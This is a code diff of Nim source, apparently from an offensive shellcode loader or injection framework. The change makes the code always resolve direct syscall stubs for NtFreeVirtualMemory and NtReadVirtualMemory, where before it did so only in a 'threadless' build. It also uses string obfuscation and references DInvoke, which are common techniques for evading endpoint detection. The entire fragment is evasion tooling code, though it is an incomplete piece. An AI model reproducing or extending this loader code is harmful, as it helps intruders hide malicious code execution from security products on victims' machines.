@@ -431,20 +431,20 @@ let RetrieveSyscallStubs * = """
         when defined(verbose):
             echo obf("[*] GetSyscallStub NtTestAlert: ") & $syssuccess
 
-    when defined(threadless):
-      # get NtFreeVirtualMemory and NtReadVirtualMemory
-      var syscallStub_NtFreeVirtualMemory: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (13 * cast[HANDLE](SYSCALL_STUB_SIZE))
-      var syscallStub_NtReadVirtualMemory: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (14 * cast[HANDLE](SYSCALL_STUB_SIZE))
-      # define NtFreeVirtualMemory
-      NtFreeVirtualMemory = cast[myNtFreeVirtualMemory](cast[LPVOID](syscallStub_NtFreeVirtualMemory))
-      # define NtReadVirtualMemory
-      NtReadVirtualMemory = cast[myNtReadVirtualMemory](cast[LPVOID](syscallStub_NtReadVirtualMemory))
-      syssuccess = GetSyscallStub(obf("NtFreeVirtualMemory"), cast[LPVOID](syscallStub_NtFreeVirtualMemory))
-      when defined(verbose):
-          echo obf("[*] GetSyscallStub NtFreeVirtualMemory: ") & $syssuccess
-      syssuccess = GetSyscallStub(obf("NtReadVirtualMemory"), cast[LPVOID](syscallStub_NtReadVirtualMemory))
-      when defined(verbose):
-          echo obf("[*] GetSyscallStub NtReadVirtualMemory: ") & $syssuccess
+  
+    # get NtFreeVirtualMemory and NtReadVirtualMemory
+    var syscallStub_NtFreeVirtualMemory: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (13 * cast[HANDLE](SYSCALL_STUB_SIZE))
+    var syscallStub_NtReadVirtualMemory: HANDLE = cast[HANDLE](syscallStub_NtProtect) + (14 * cast[HANDLE](SYSCALL_STUB_SIZE))
+    # define NtFreeVirtualMemory
+    NtFreeVirtualMemory = cast[myNtFreeVirtualMemory](cast[LPVOID](syscallStub_NtFreeVirtualMemory))
+    # define NtReadVirtualMemory
+    NtReadVirtualMemory = cast[myNtReadVirtualMemory](cast[LPVOID](syscallStub_NtReadVirtualMemory))
+    syssuccess = GetSyscallStub(obf("NtFreeVirtualMemory"), cast[LPVOID](syscallStub_NtFreeVirtualMemory))
+    when defined(verbose):
+        echo obf("[*] GetSyscallStub NtFreeVirtualMemory: ") & $syssuccess
+    syssuccess = GetSyscallStub(obf("NtReadVirtualMemory"), cast[LPVOID](syscallStub_NtReadVirtualMemory))
+    when defined(verbose):
+        echo obf("[*] GetSyscallStub NtReadVirtualMemory: ") & $syssuccess
 
     when defined(DInvoke):
       when defined(verbose):
